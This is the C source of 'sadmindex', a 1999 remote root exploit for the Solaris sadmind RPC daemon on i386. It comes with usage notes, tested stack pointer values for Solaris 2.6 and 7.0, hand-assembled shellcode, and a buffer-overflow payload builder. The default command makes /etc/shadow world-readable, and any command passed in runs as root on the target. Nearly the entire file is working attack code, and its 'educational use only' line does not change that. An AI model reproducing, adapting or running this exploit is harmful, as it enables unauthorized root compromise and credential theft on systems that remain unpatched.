/**
***  sadmindex - i386 Solaris remote root exploit for /usr/sbin/sadmind
***
***  Tested and confirmed under Solaris 2.6 and 7.0 (i386)
***
***  Usage:  % sadmindex -h hostname -c command -s sp -j junk [-o offset] \
***                      [-a alignment] [-p]
***
***  where hostname is the hostname of the machine running the vulnerable
***  system administration daemon, command is the command to run as root
***  on the vulnerable machine, sp is the %esp stack pointer value, junk
***  is the number of bytes needed to fill the target stack frame (which
***  should be a multiple of 4), offset is the number of bytes to add to
***  sp to calculate the desired return address, and alignment is the
***  number of bytes needed to correctly align the contents of the exploit
***  buffer.
***
***  If run with a -p option, the exploit will only "ping" sadmind on the
***  remote machine to start it running.  The daemon will be otherwise
***  untouched.  Since pinging the daemon does not require an exploit
***  buffer to be constructed, you can safely omit the -c, -s, and -j
***  options if you use -p.
***
***  When specifying a command, be sure to pass it to the exploit as a
***  single argument, namely enclose the command string in quotes if it
***  contains spaces or other special shell delimiter characters.  The
***  exploit will pass this string without modification to /bin/sh -c on
***  the remote machine, so any normally allowed Bourne shell syntax is
***  also allowed in the command string.  The command string and the
***  assembly code to run it must fit inside a buffer of 512 bytes, so
***  the command string has a maximum length of about 390 bytes or so.
***
***  I have provided confirmed %esp stack pointer values for Solaris on a
***  Pentium PC system running Solaris 2.6 5/98 and on a Pentium PC system
***  running Solaris 7.0 10/98.  On each system, sadmind was started from
***  an instance of inetd that was started at boot time by init.  There
***  is a fair possibility that the demonstration values will not work
***  due to differing sets of environment variables, for example if the
***  the running inetd on the remote machine was started manually from an
***  interactive shell.  If you find that the sample value for %esp does
***  not work, try adjusting the value by -2048 to 2048 from the sample in
***  increments of 32 for starters.  The junk parameter seems to vary from
***  version to version, but the sample values should be appropriate for
***  the listed versions and are not likely to need adjustment.  The offset
***  parameter and the alignment parameter have default values that will be
***  used if no overriding values are specified on the command line.  The
***  default values should be suitable and it will not likely be necessary
***  to override them.
***
***  Demonstration values for i386 Solaris:
***
***  (2.6)  sadmindex -h host.example.com -c "touch HEH" -s 0x080418ec -j 512
***  (7.0)  sadmindex -h host.example.com -c "touch HEH" -s 0x08041798 -j 536
***
***  THIS CODE FOR EDUCATIONAL USE ONLY IN AN ETHICAL MANNER
***
***  Cheez Whiz
***  cheezbeast@hotmail.com
***
***  June 24, 1999
**/

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <rpc/rpc.h>

#define NETMGT_PROG 100232
#define NETMGT_VERS 10
#define NETMGT_PROC_PING 0
#define NETMGT_PROC_SERVICE 1

#define NETMGT_UDP_PING_TIMEOUT 30
#define NETMGT_UDP_PING_RETRY_TIMEOUT 5
#define NETMGT_UDP_SERVICE_TIMEOUT 1
#define NETMGT_UDP_SERVICE_RETRY_TIMEOUT 2

#define NETMGT_HEADER_TYPE 6
#define NETMGT_ARG_INT 3
#define NETMGT_ARG_STRING 9
#define NETMGT_ENDOFARGS "netmgt_endofargs"

#define ADM_FW_VERSION "ADM_FW_VERSION"
#define ADM_CLIENT_DOMAIN "ADM_CLIENT_DOMAIN"
#define ADM_FENCE "ADM_FENCE"

#define BUFLEN 1056		/* 548+8+512-12 */
#define ADDRLEN	8
#define LEN 76

/* #define JUNK 512 */		/* 524-12 (Solaris 2.6) */
/* #define JUNK 536 */		/* 548-12 (Solaris 7.0) */
#define OFFSET 572		/* default offset */
#define ALIGNMENT 0		/* default alignment */

#define NOP 0x90

char shell[] =
/*   0 */ "\xeb\x45"                         /* jmp springboard       */
/* syscall:                                                           */
/*   2 */ "\x9a\xff\xff\xff\xff\x07\xff"     /* lcall 0x7,0x0         */
/*   9 */ "\xc3"                             /* ret                   */
/* start:                                                             */
/*  10 */ "\x5e"                             /* popl %esi             */
/*  11 */ "\x31\xc0"                         /* xor %eax,%eax         */
/*  13 */ "\x89\x46\xb7"                     /* movl %eax,-0x49(%esi) */
/*  16 */ "\x88\x46\xbc"                     /* movb %al,-0x44(%esi)  */
/* execve:                                                            */
/*  19 */ "\x31\xc0"                         /* xor %eax,%eax         */
/*  21 */ "\x50"                             /* pushl %eax            */
/*  22 */ "\x56"                             /* pushl %esi            */
/*  23 */ "\x8b\x1e"                         /* movl (%esi),%ebx      */
/*  25 */ "\xf7\xdb"                         /* negl %ebx             */
/*  27 */ "\x89\xf7"                         /* movl %esi,%edi        */
/*  29 */ "\x83\xc7\x10"                     /* addl $0x10,%edi       */
/*  32 */ "\x57"                             /* pushl %edi            */
/*  33 */ "\x89\x3e"                         /* movl %edi,(%esi)      */
/*  35 */ "\x83\xc7\x08"                     /* addl $0x8,%edi        */
/*  38 */ "\x88\x47\xff"                     /* movb %al,-0x1(%edi)   */
/*  41 */ "\x89\x7e\x04"                     /* movl %edi,0x4(%esi)   */
/*  44 */ "\x83\xc7\x03"                     /* addl $0x3,%edi        */
/*  47 */ "\x88\x47\xff"                     /* movb %al,-0x1(%edi)   */
/*  50 */ "\x89\x7e\x08"                     /* movl %edi,0x8(%esi)   */
/*  53 */ "\x01\xdf"                         /* addl %ebx,%edi        */
/*  55 */ "\x88\x47\xff"                     /* movb %al,-0x1(%edi)   */
/*  58 */ "\x89\x46\x0c"                     /* movl %eax,0xc(%esi)   */
/*  61 */ "\xb0\x3b"                         /* movb $0x3b,%al        */
/*  63 */ "\xe8\xbe\xff\xff\xff"             /* call syscall          */
/*  68 */ "\x83\xc4\x0c"                     /* addl $0xc,%esp        */
/* springboard:                                                       */
/*  71 */ "\xe8\xbe\xff\xff\xff"             /* call start            */
/* data:                                                              */
/*  76 */ "\xff\xff\xff\xff"                 /* DATA                  */
/*  80 */ "\xff\xff\xff\xff"                 /* DATA                  */
/*  84 */ "\xff\xff\xff\xff"                 /* DATA                  */
/*  88 */ "\xff\xff\xff\xff"                 /* DATA                  */
/*  92 */ "\x2f\x62\x69\x6e\x2f\x73\x68\xff" /* DATA                  */
/* 100 */ "\x2d\x63\xff";                    /* DATA                  */

extern char *optarg;

struct nm_send_header {
    struct timeval timeval1;
    struct timeval timeval2;
    struct timeval timeval3;
    unsigned int uint1;
    unsigned int uint2;
    unsigned int uint3;
    unsigned int uint4;
    unsigned int uint5;
    struct in_addr inaddr1;
    struct in_addr inaddr2;
    unsigned long ulong1;
    unsigned long ulong2;
    struct in_addr inaddr3;
    unsigned long ulong3;
    unsigned long ulong4;
    unsigned long ulong5;
    struct timeval timeval4;
    unsigned int uint6;
    struct timeval timeval5;
    char *string1;
    char *string2;
    char *string3;
    unsigned int uint7;
};

struct nm_send_arg_int {
    char *string1;
    unsigned int uint1;
    unsigned int uint2;
    int int1;
    unsigned int uint3;
    unsigned int uint4;
};

struct nm_send_arg_string {
    char *string1;
    unsigned int uint1;
    unsigned int uint2;
    char *string2;
    unsigned int uint3;
    unsigned int uint4;
};

struct nm_send_footer {
    char *string1;
};

struct nm_send {
    struct nm_send_header header;
    struct nm_send_arg_int version;
    struct nm_send_arg_string string;
    struct nm_send_arg_int fence;
    struct nm_send_footer footer;
};

struct nm_reply {
    unsigned int uint1;
    unsigned int uint2;
    char *string1;
};

bool_t
xdr_nm_send_header(XDR *xdrs, struct nm_send_header *objp)
{
    char *addr;
    size_t size = sizeof(struct in_addr);

    if (!xdr_long(xdrs, &objp->timeval1.tv_sec))
	return (FALSE);
    if (!xdr_long(xdrs, &objp->timeval1.tv_usec))
	return (FALSE);
    if (!xdr_long(xdrs, &objp->timeval2.tv_sec))
	return (FALSE);
    if (!xdr_long(xdrs, &objp->timeval2.tv_usec))
	return (FALSE);
    if (!xdr_long(xdrs, &objp->timeval3.tv_sec))
	return (FALSE);
    if (!xdr_long(xdrs, &objp->timeval3.tv_usec))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint1))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint2))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint3))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint4))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint5))
	return (FALSE);
    addr = (char *) &objp->inaddr1.s_addr;
    if (!xdr_bytes(xdrs, &addr, &size, size))
	return (FALSE);
    addr = (char *) &objp->inaddr2.s_addr;
    if (!xdr_bytes(xdrs, &addr, &size, size))
	return (FALSE);
    if (!xdr_u_long(xdrs, &objp->ulong1))
	return (FALSE);
    if (!xdr_u_long(xdrs, &objp->ulong2))
	return (FALSE);
    addr = (char *) &objp->inaddr3.s_addr;
    if (!xdr_bytes(xdrs, &addr, &size, size))
	return (FALSE);
    if (!xdr_u_long(xdrs, &objp->ulong3))
	return (FALSE);
    if (!xdr_u_long(xdrs, &objp->ulong4))
	return (FALSE);
    if (!xdr_u_long(xdrs, &objp->ulong5))
	return (FALSE);
    if (!xdr_long(xdrs, &objp->timeval4.tv_sec))
	return (FALSE);
    if (!xdr_long(xdrs, &objp->timeval4.tv_usec))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint6))
	return (FALSE);
    if (!xdr_long(xdrs, &objp->timeval5.tv_sec))
	return (FALSE);
    if (!xdr_long(xdrs, &objp->timeval5.tv_usec))
	return (FALSE);
    if (!xdr_wrapstring(xdrs, &objp->string1))
	return (FALSE);
    if (!xdr_wrapstring(xdrs, &objp->string2))
	return (FALSE);
    if (!xdr_wrapstring(xdrs, &objp->string3))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint7))
	return (FALSE);
    return (TRUE);
}

bool_t
xdr_nm_send_arg_int(XDR *xdrs, struct nm_send_arg_int *objp)
{
    if (!xdr_wrapstring(xdrs, &objp->string1))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint1))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint2))
	return (FALSE);
    if (!xdr_int(xdrs, &objp->int1))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint3))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint4))
	return (FALSE);
    return (TRUE);
}

bool_t
xdr_nm_send_arg_string(XDR *xdrs, struct nm_send_arg_string *objp)
{
    if (!xdr_wrapstring(xdrs, &objp->string1))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint1))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint2))
	return (FALSE);
    if (!xdr_wrapstring(xdrs, &objp->string2))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint3))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint4))
	return (FALSE);
    return (TRUE);
}

bool_t
xdr_nm_send_footer(XDR *xdrs, struct nm_send_footer *objp)
{
    if (!xdr_wrapstring(xdrs, &objp->string1))
	return (FALSE);
    return (TRUE);
}

bool_t
xdr_nm_send(XDR *xdrs, struct nm_send *objp)
{
    if (!xdr_nm_send_header(xdrs, &objp->header))
	return (FALSE);
    if (!xdr_nm_send_arg_int(xdrs, &objp->version))
	return (FALSE);
    if (!xdr_nm_send_arg_string(xdrs, &objp->string))
	return (FALSE);
    if (!xdr_nm_send_arg_int(xdrs, &objp->fence))
	return (FALSE);
    if (!xdr_nm_send_footer(xdrs, &objp->footer))
	return (FALSE);
    return (TRUE);
}

bool_t
xdr_nm_reply(XDR *xdrs, struct nm_reply *objp)
{
    if (!xdr_u_int(xdrs, &objp->uint1))
	return (FALSE);
    if (!xdr_u_int(xdrs, &objp->uint2))
	return (FALSE);
    if (!xdr_wrapstring(xdrs, &objp->string1))
	return (FALSE);
    return (TRUE);
}

int
main(int argc, char *argv[])
{
    CLIENT *cl;
    struct nm_send send;
    struct nm_reply reply;
    struct timeval tm;
    enum clnt_stat stat;
    int c, i, len, slen, clen;
    char *program, *cp, buf[BUFLEN+1];
    char *hostname, *command;
    int junk = 0, offset, alignment, pinging = 0;
    unsigned long int sp = 0, addr;

    program = argv[0];
    hostname = "localhost";
    command = "chmod 666 /etc/shadow";
    offset = OFFSET; alignment = ALIGNMENT;
    while ((c = getopt(argc, argv, "h:c:s:j:o:a:p")) != EOF) {
	switch (c) {
	case 'h':
	    hostname = optarg;
	    break;
	case 'c':
	    command = optarg; 
	    break;
	case 's':
	    sp = strtoul(optarg, NULL, 0);
	    break;
	case 'j':
	    junk = (int) strtol(optarg, NULL, 0);
	    break;
	case 'o':
	    offset = (int) strtol(optarg, NULL, 0);
	    break;
	case 'a':
	    alignment = (int) strtol(optarg, NULL, 0);
	    break;
	case 'p':
	    pinging = 1;
	    break;
	default:
	    fprintf(stderr, "usage: %s -h hostname -c command -s sp -j junk "
		    "[-o offset] [-a alignment] [-p]\n", program);
	    exit(1);
	    break;
	}
    }
    memset(buf, NOP, BUFLEN);
    junk &= 0xfffffffc;
    for (i = 0, cp = buf + alignment; i < junk / 4; i++) {
	*cp++ = (sp >>  0) & 0xff;
	*cp++ = (sp >>  8) & 0xff;
	*cp++ = (sp >> 16) & 0xff;
	*cp++ = (sp >> 24) & 0xff;
    }
    addr = sp + offset;
    for (i = 0; i < ADDRLEN / 4; i++) {
	*cp++ = (addr >>  0) & 0xff;
	*cp++ = (addr >>  8) & 0xff;
	*cp++ = (addr >> 16) & 0xff;
	*cp++ = (addr >> 24) & 0xff;
    }
    slen = strlen(shell); clen = strlen(command);
    len = clen; len++; len = -len;
    shell[LEN+0] = (len >>  0) & 0xff;
    shell[LEN+1] = (len >>  8) & 0xff;
    shell[LEN+2] = (len >> 16) & 0xff;
    shell[LEN+3] = (len >> 24) & 0xff;
    cp = buf + BUFLEN - 1 - clen - slen;
    memcpy(cp, shell, slen); cp += slen;
    memcpy(cp, command, clen); cp += clen;
    *cp = '\xff';
    buf[BUFLEN] = '\0';
    memset(&send, 0, sizeof(struct nm_send));
    send.header.uint2 = NETMGT_HEADER_TYPE;
    send.header.string1 = "";
    send.header.string2 = "";
    send.header.string3 = "";
    send.header.uint7 =
	strlen(ADM_FW_VERSION) + 1 +
	(4 * sizeof(unsigned int)) + sizeof(int) +
	strlen(ADM_CLIENT_DOMAIN) + 1 +
	(4 * sizeof(unsigned int)) + strlen(buf) + 1 +
	strlen(ADM_FENCE) + 1 +
	(4 * sizeof(unsigned int)) + sizeof(int) +
	strlen(NETMGT_ENDOFARGS) + 1;
    send.version.string1 = ADM_FW_VERSION;
    send.version.uint1 = NETMGT_ARG_INT;
    send.version.uint2 = sizeof(int);
    send.version.int1 = 1;
    send.string.string1 = ADM_CLIENT_DOMAIN;
    send.string.uint1 = NETMGT_ARG_STRING;
    send.string.uint2 = strlen(buf);
    send.string.string2 = buf;
    send.fence.string1 = ADM_FENCE;
    send.fence.uint1 = NETMGT_ARG_INT;
    send.fence.uint2 = sizeof(int);
    send.fence.int1 = 666;
    send.footer.string1 = NETMGT_ENDOFARGS;
    cl = clnt_create(hostname, NETMGT_PROG, NETMGT_VERS, "udp");
    if (cl == NULL) {
	clnt_pcreateerror("clnt_create");
	exit(1);
    }
    cl->cl_auth = authunix_create("localhost", 0, 0, 0, NULL);
    if (!pinging) {
	fprintf(stdout,
		"%%esp 0x%08lx offset %d --> return address 0x%08lx [%d+%d]\n",
		sp, offset, addr, alignment, junk);
	tm.tv_sec = NETMGT_UDP_SERVICE_TIMEOUT; tm.tv_usec = 0;
	if (!clnt_control(cl, CLSET_TIMEOUT, (char *) &tm)) {
	    fprintf(stderr, "exploit failed; unable to set timeout\n");
	    exit(1);
	}
	tm.tv_sec = NETMGT_UDP_SERVICE_RETRY_TIMEOUT; tm.tv_usec = 0;
	if (!clnt_control(cl, CLSET_RETRY_TIMEOUT, (char *) &tm)) {
	    fprintf(stderr, "exploit failed; unable to set timeout\n");
	    exit(1);
	}
	stat = clnt_call(cl, NETMGT_PROC_SERVICE,
			 xdr_nm_send, (caddr_t) &send,
			 xdr_nm_reply, (caddr_t) &reply, tm);
	if (stat != RPC_SUCCESS) {
	    clnt_perror(cl, "clnt_call");
	    fprintf(stdout, "now check if exploit worked; "
		    "RPC failure was expected\n");
	    exit(0);
	}
	fprintf(stderr, "exploit failed; "
		"RPC succeeded and returned { %u, %u, \"%s\" }\n",
		reply.uint1, reply.uint2, reply.string1);
	clnt_destroy(cl);
	exit(1);
    } else {
	tm.tv_sec = NETMGT_UDP_PING_TIMEOUT; tm.tv_usec = 0;
	if (!clnt_control(cl, CLSET_TIMEOUT, (char *) &tm)) {
	    fprintf(stderr, "exploit failed; unable to set timeout\n");
	    exit(1);
	}
	tm.tv_sec = NETMGT_UDP_PING_RETRY_TIMEOUT; tm.tv_usec = 0;
	if (!clnt_control(cl, CLSET_RETRY_TIMEOUT, (char *) &tm)) {
	    fprintf(stderr, "exploit failed; unable to set timeout\n");
	    exit(1);
	}
	stat = clnt_call(cl, NETMGT_PROC_PING,
			 xdr_void, NULL,
			 xdr_void, NULL, tm);
	if (stat != RPC_SUCCESS) {
	    clnt_perror(cl, "clnt_call");
	    exit(1);
	}
	clnt_destroy(cl);
	exit(0);
    }
}
